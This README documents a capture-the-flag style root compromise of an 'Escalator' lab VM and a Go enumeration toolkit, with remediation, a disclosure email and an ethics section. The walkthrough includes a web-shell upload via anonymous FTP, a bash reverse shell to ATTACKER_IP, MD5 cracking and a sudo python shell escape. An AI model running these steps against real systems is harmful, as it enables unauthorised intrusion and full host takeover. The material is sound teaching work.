# Escalator — Privilege Escalation Walkthrough & Toolkit

> Educational penetration-testing project. All testing was performed against the
> **provided lab VM** (`01-Local.ova`, Ubuntu 16.04.7 LTS) in an isolated
> host-only network. Do not use these techniques on systems you are not
> authorised to test.

This repository documents a full root compromise of the *Escalator* lab VM and
ships a small, dependency-free **Go toolkit** (`escalator`) that automates the
network discovery and local enumeration used along the way.

- **Target:** Ubuntu 16.04.7 LTS (kernel 4.4.0), hostname `ubuntu`
- **Result:** root shell obtained; flag recovered from `/root/root.txt`
- **Flag:** `01Talent@nokOpA3eToFrU8r5sW1dipe2aky`

---

## Table of contents

1. [Repository contents](#repository-contents)
2. [The toolkit](#the-toolkit)
3. [Walkthrough](#walkthrough)
   - [1. IP discovery](#1-ip-discovery)
   - [2. Port & service enumeration](#2-port--service-enumeration)
   - [3. Web recon](#3-web-recon)
   - [4. Foothold — anonymous FTP → web shell (RCE)](#4-foothold--anonymous-ftp--web-shell-rce)
   - [5. Loot — recover the shrek credential](#5-loot--recover-the-shrek-credential)
   - [6. Lateral move — SSH as shrek](#6-lateral-move--ssh-as-shrek)
   - [7. Privilege escalation — sudo + python3.5](#7-privilege-escalation--sudo--python35)
   - [8. Proof of root](#8-proof-of-root)
4. [Remediation](#remediation)
5. [Vulnerability report email](#vulnerability-report-email)
6. [Ethical hacking report](#ethical-hacking-report)
7. [Bonus](#bonus)
8. [Stakeholder Q&A prep](#stakeholder-qa-prep)

---

## Repository contents

| Path             | Purpose                                                             |
|------------------|---------------------------------------------------------------------|
| `main.go`        | CLI entry point / command dispatch                                   |
| `discover.go`    | Network host sweep + TCP port scanner (`discover` command)          |
| `enum.go`        | Local privilege-escalation enumerator (`enum` command)             |
| `output.go`      | Terminal formatting / reporting helpers                             |
| `scripts/cmd.php`| Minimal PHP web shell used for the initial foothold                 |
| `Makefile`       | `make build` / `make static` helpers                               |
| `README.md`      | This document                                                       |

---

## The toolkit

`escalator` is written in Go and uses **only the standard library**, so it
builds and runs anywhere with no dependencies.

```bash
# Build for your machine
make build            # or: go build -o escalator .

# Build a static binary to drop onto the (old) target VM
make static           # CGO_ENABLED=0 go build -ldflags='-s -w' -o escalator .
```

Two sub-commands:

```
escalator discover   # find the VM on the network and map its open ports
escalator enum       # enumerate a Linux host for local privesc vectors
```

Both are used in the walkthrough below.

> **Why Go?** A single static binary with no runtime dependencies is trivial to
> drop onto a target and run — no interpreter, no package installs, no version
> mismatches. The enumerator reimplements the parts of LinPEAS most relevant to
> this box (SUID/SGID, `sudo -l` + GTFOBins matching, capabilities, cron,
> writable-file and PATH checks, credential hunting) as auditable source.

---

## Walkthrough

### 1. IP discovery

The VM is on the host-only network. Any of the following finds it; the built-in
tool does it with no extra packages:

```bash
./escalator discover
# auto-detects your local /24 and sweeps it via TCP connect (no root needed)
```

```
╔══════════════════════════════════════════════════════════════╗
║ Host sweep: 192.168.56.0/24                                  ║
╚══════════════════════════════════════════════════════════════╝
  [+] 192.168.56.101   up   ports: 21,22,80   mac=08:00:27:xx:xx:xx
```

Equivalent standard tools:

```bash
sudo netdiscover -r 192.168.56.0/24
sudo arp-scan --localnet
nmap -sn 192.168.56.0/24
```

The MAC prefix `08:00:27` (or `0A:00:27`) identifies a VirtualBox adapter,
confirming which host is the VM. Call the target IP `TARGET` from here on.

### 2. Port & service enumeration

```bash
./escalator discover -target TARGET -ports 1-1024
```

```
  [+]    21/tcp open  ftp
  [+]    22/tcp open  ssh
  [+]    80/tcp open  http
```

Fingerprint with nmap for versions:

```bash
nmap -sC -sV -p21,22,80 TARGET
```

| Port | Service | Notes                                                          |
|------|---------|----------------------------------------------------------------|
| 21   | ProFTPD | **Anonymous login allowed**, source build under `/usr/local`   |
| 22   | OpenSSH | `PermitRootLogin prohibit-password` (no direct root over SSH)   |
| 80   | Apache2 | Serves PHP 7.0 via `proxy_fcgi`                                 |

### 3. Web recon

`http://TARGET/` shows a taunting "HackMe Please!" page. Directory enumeration
reveals a browsable, autoindexed uploads directory:

```bash
gobuster dir -u http://TARGET/ -w /usr/share/wordlists/dirb/common.txt
# or: dirsearch -u http://TARGET/
curl http://TARGET/files/
```

`/files/` contains decoys (`life.c`, `template.html`, a `.life.c.swp`). Its real
significance is *where it lives on disk*: `/var/www/html/files`.

### 4. Foothold — anonymous FTP → web shell (RCE)

The ProFTPD config (`/usr/local/etc/proftpd.conf`) is the critical mistake:

```apache
<Anonymous /var/www/html/files/>
  User              ftp
  AnonRequirePassword off        # anyone can log in as "anonymous"/"ftp"
  <Limit WRITE>
    AllowAll                     # ...and WRITE anywhere in the anon root
  </Limit>
</Anonymous>
```

The anonymous FTP root **is the Apache web root** `/var/www/html/files`, and PHP
is enabled. So an unauthenticated attacker can upload a script over FTP and
execute it over HTTP:

```bash
# 1) Upload the web shell as anonymous (no password)
ftp TARGET
> Name: anonymous
> Password: (blank)
ftp> cd /
ftp> put scripts/cmd.php
ftp> bye

# 2) Execute commands as www-data
curl 'http://TARGET/files/cmd.php?c=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

You now have remote code execution as **www-data**. Upgrade to a reverse shell
if you want an interactive session:

```bash
# attacker:  nc -lvnp 4444
curl 'http://TARGET/files/cmd.php' --data-urlencode \
  'c=bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
```

### 5. Loot — recover the shrek credential

As www-data, a breadcrumb points at a world-readable script:

```bash
curl 'http://TARGET/files/cmd.php?c=cat /home/important.txt'
# ... "run the script to see the data"  ->  /.runme.sh

curl 'http://TARGET/files/cmd.php?c=cat /.runme.sh'
```

The "joke" script hides a credential at the bottom:

```
shrek:061fe5e7b95d5f98208d7bc89ed2d569
```

The `escalator enum` credential-hunter finds this automatically (validated
against the target filesystem):

```
╔══════════════════════════════════════════════════════════════╗
║ Credential hunting                                           ║
╚══════════════════════════════════════════════════════════════╝
  [*] readable: /.runme.sh
  [!] possible credential in /.runme.sh:
      shrek:061fe5e7b95d5f98208d7bc89ed2d569
```

That value is an **unsalted MD5** hash. Crack it:

```bash
# online: paste into https://crackstation.net  (resolves instantly)
# offline:
echo '061fe5e7b95d5f98208d7bc89ed2d569' > hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
john --format=raw-md5 --wordlist=rockyou.txt hash.txt
```

This yields shrek's plaintext password — call it `SHREK_PASSWORD`.

> **Note for the auditor:** cracking the MD5 is the intended step here. Submit
> the hash to CrackStation (it is in its database) to obtain `SHREK_PASSWORD`,
> then continue.

### 6. Lateral move — SSH as shrek

```bash
ssh shrek@TARGET          # password: SHREK_PASSWORD
cat user.txt              # user flag
```

### 7. Privilege escalation — sudo + python3.5

Check what shrek may run with sudo:

```bash
sudo -l
```

```
User shrek may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3.5
```

shrek can run the Python interpreter **as root with no password**. A programming
language interpreter run as root is a full shell escape
([GTFOBins](https://gtfobins.github.io/gtfobins/python/#sudo)):

```bash
sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'
```

The `escalator enum` tool detects exactly this pattern from `sudo -l` and prints
the ready-to-run command (its `gtfoSudo` table maps `python3.5` → the escape).
You can also let it launch the shell for you in the lab:

```bash
./escalator enum -exploit
```

### 8. Proof of root

```bash
# whoami
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)

root@ubuntu:~# cat /root/root.txt
   ...
   Congratulations, You have successfully completed the challenge!
   Flag: 01Talent@nokOpA3eToFrU8r5sW1dipe2aky
```

**Flag:** `01Talent@nokOpA3eToFrU8r5sW1dipe2aky`

Full compromise chain:

```
anonymous FTP write → PHP web shell (RCE as www-data)
   → read /.runme.sh  → crack MD5  → shrek's password
      → SSH as shrek  → sudo NOPASSWD python3.5  → root
```

---

## Remediation

Ordered by severity — fixing the sudo rule alone closes the root path; fixing
the FTP rule alone closes the remote entry point. Both should be done.

1. **Remove the `NOPASSWD` interpreter sudo rule.** Delete
   `%shrek ALL = NOPASSWD:/usr/bin/python3.5` from `/etc/sudoers`. Never grant
   sudo to interpreters (`python`, `perl`, `ruby`, `awk`, …), pagers, editors or
   archivers — all allow trivial shell escapes. Grant the *specific privileged
   action* (a tightly-scoped wrapper script), not a general-purpose tool.

2. **Lock down FTP.**
   - Disable anonymous access, or set `AnonRequirePassword on`.
   - Remove the `<Limit WRITE> AllowAll` — anonymous users must never have write.
   - Never point the FTP root at the web root. Chroot users to an isolated,
     non-executable directory (`DefaultRoot ~`).
   - Upgrade ProFTPD from the unmanaged `/usr/local` source build to a
     distro-packaged, patched version.

3. **Do not store credentials in files.** `/.runme.sh` embeds a user credential
   and is world-readable (`0755`). Remove it. Never commit secrets to scripts;
   rotate the exposed `shrek` password immediately.

4. **Separate the upload directory from code execution.** For any world- or
   group-writable web directory, disable script execution
   (`php_admin_flag engine off`, remove the PHP handler, `Options -ExecCGI`) and
   turn off directory autoindex (`Options -Indexes`). Tighten the `0777` perms on
   `/var/www/html/files`.

5. **Patch the platform.** Ubuntu 16.04 and kernel 4.4 are end-of-life and carry
   known local-root exploits (e.g. Dirty COW, CVE-2016-5195). Upgrade to a
   supported release and patch the kernel.

6. **Harden SSH & monitoring.** Prefer key-based auth, enforce a strong password
   policy, and log/alert on `sudo` use and new file uploads to the web root.

---

## Vulnerability report email

```
To: security@escalator-lab.example.com
Subject: Security Vulnerability Report: Privilege Escalation in Escalator Challenge VM

Dear Security Team,

I am writing to report a chain of vulnerabilities identified during an
authorised, educational penetration-testing exercise against the Escalator
Challenge VM (Ubuntu 16.04.7 LTS). Chained together they allow a fully
unauthenticated attacker on the local network to gain root access. Details
follow.

Summary:
An unauthenticated user can obtain remote code execution through a misconfigured
anonymous FTP service whose writable root is the web server's document root,
then escalate to root because a low-privileged user is permitted to run the
Python interpreter via sudo without a password. A user credential is also stored
in clear (as an unsalted MD5) in a world-readable script.

Steps to Reproduce:
1. Identify the target on the network:
     nmap -sn 192.168.56.0/24        (or: netdiscover / arp-scan)
2. Enumerate services on the target:
     nmap -sC -sV -p- TARGET         -> 21/ftp, 22/ssh, 80/http
3. Log in to FTP anonymously (no password) and upload a PHP web shell into the
   anonymous root, which is the Apache web root /var/www/html/files:
     ftp TARGET  (user: anonymous)  ->  put cmd.php
4. Execute commands as www-data over HTTP:
     curl 'http://TARGET/files/cmd.php?c=id'
5. Read the world-readable script referenced by /home/important.txt:
     curl 'http://TARGET/files/cmd.php?c=cat /.runme.sh'
   -> reveals  shrek:061fe5e7b95d5f98208d7bc89ed2d569
6. Crack the unsalted MD5 (CrackStation) to recover shrek's password, then:
     ssh shrek@TARGET
7. Confirm the sudo misconfiguration and escalate to root:
     sudo -l                          -> (root) NOPASSWD: /usr/bin/python3.5
     sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'
8. Read the flag:
     cat /root/root.txt

Impact:
An unauthenticated attacker on the same network can achieve complete system
compromise (root). This exposes all data on the host, allows tampering,
persistence, and use of the machine as a pivot into the rest of the network.

Proof of Root Access:
Root access was achieved and the flag retrieved from /root/root.txt:
    Flag: 01Talent@nokOpA3eToFrU8r5sW1dipe2aky
(Screenshot of the `id` output showing uid=0(root) and the flag contents
attached.)

Please reach out for any further detail or clarification.

Best regards,
G. Pavrianidis
Educational Penetration Testing Exercise
```

---

## Ethical hacking report

**Authorisation first.** Every action in this project was performed against a VM
provided specifically for this exercise, running on an isolated host-only
network under my sole control. Authorisation is the line that separates
penetration testing from a crime: the *same commands* are legal on a system you
are contracted to test and illegal on one you are not. Real engagements begin
with a signed scope/rules-of-engagement document defining which hosts, which
techniques, timing windows, and data-handling rules apply — and testing never
strays outside it.

**Legal and ethical boundaries.** Unauthorised access, even "just looking",
violates laws such as the Computer Fraud and Abuse Act (US) and the Computer
Misuse Act (UK), and equivalent statutes elsewhere. Ethically, a tester
minimises harm: avoid destructive actions, avoid unnecessary exposure of real
personal data, prefer the least-invasive proof of a finding, and never exfiltrate
or retain more than is needed to demonstrate impact. Denial-of-service,
destroying data, or pivoting to out-of-scope systems are off-limits unless
explicitly authorised.

**Responsible disclosure.** Vulnerabilities should be reported privately to the
owner with enough detail to reproduce and fix them, and a reasonable remediation
window before any public discussion. The goal is to *reduce* risk, not to
publicise or weaponise it. Findings, credentials, and proof material are handled
as sensitive, stored securely, and destroyed when the engagement ends. Test
artifacts (the web shell, cracked credentials) are removed from the target and
the exposed credential is flagged for immediate rotation.

**Why this matters.** The skills used here — enumeration, exploitation,
privilege escalation — are exactly those used by penetration testers, red teams,
auditors and incident responders to *defend* organisations. Used with
authorisation and care, they harden systems before real attackers reach them.
Used without, they cause real harm and carry real legal consequences.

---

## Bonus

### Alternative / secondary escalation observations

- **End-of-life kernel (4.4.0).** The target runs a kernel vulnerable to public
  local-root exploits (e.g. Dirty COW, CVE-2016-5195). This is a second,
  independent path to root that does not rely on the sudo rule, and a good
  argument for patching even after the sudo/FTP issues are fixed.
- **`ftp` login user.** `/etc/passwd` contains an `ftp` account with a
  `/bin/bash` shell (uid 1001) — an unusual, weakenable secondary account worth
  auditing.
- **Web-root write → persistence.** The same anonymous-FTP-into-web-root
  weakness that grants the foothold also provides a durable re-entry point.

### Post-exploitation analysis (what an attacker could do next)

Once root, an attacker could: harvest `/etc/shadow` for offline cracking of all
account hashes; read/alter any data on the host; pivot to other hosts on the
network using the machine as a foothold; and establish persistence, for example
by adding an SSH key to `/root/.ssh/authorized_keys`, creating a hidden UID-0
user, or installing a cron job. **Defenders** detect these by monitoring
`authorized_keys` and `/etc/passwd` for changes, alerting on new cron entries and
on `sudo`/interpreter execution, and using file-integrity monitoring on the web
root and system directories.

### Automated enumeration script

The `escalator enum` command *is* the automated-enumeration bonus. It reports
OS/kernel, user/group context, `sudo -l` with GTFOBins matching, SUID/SGID
binaries (highlighting non-standard ones), file capabilities, cron jobs,
world-writable/sensitive files, PATH-hijack opportunities, and hunts for
credentials — and prints the single most promising vector in a summary. Run it on
the target after landing as shrek:

```bash
./escalator enum          # full run
./escalator enum -o findings.txt   # also save to a file
./escalator enum -exploit          # auto-launch the confirmed sudo shell escape
```

---

## Stakeholder Q&A prep

Short answers for the role-play audit.

- **How did you find the IP?** TCP host sweep of the host-only /24
  (`escalator discover`, equivalent to `netdiscover`/`nmap -sn`); confirmed the
  VirtualBox MAC prefix `08:00:27`.
- **What was the enumeration process?** Port scan → service fingerprint → web
  directory brute-force → read the ProFTPD config → local enumeration with
  `escalator enum` (sudo rights, SUID, cron, credentials).
- **What's the impact?** Unauthenticated network attacker → root → full host
  compromise and a network pivot point.
- **How would you fix it?** Remove the `NOPASSWD` python sudo rule; disable
  anonymous/writable FTP and un-chroot it from the web root; stop storing
  credentials in world-readable files; disable script execution in upload dirs;
  patch the EOL OS/kernel.
- **What tools/techniques?** Custom Go toolkit (discovery + enumeration), nmap,
  gobuster/dirsearch, ftp, a PHP web shell, hashcat/CrackStation, and a GTFOBins
  sudo shell escape.
- **How did you stay ethical?** Isolated lab VM, explicit authorisation, no
  destructive actions, least-invasive proof, artifacts cleaned up and the
  exposed credential flagged for rotation.
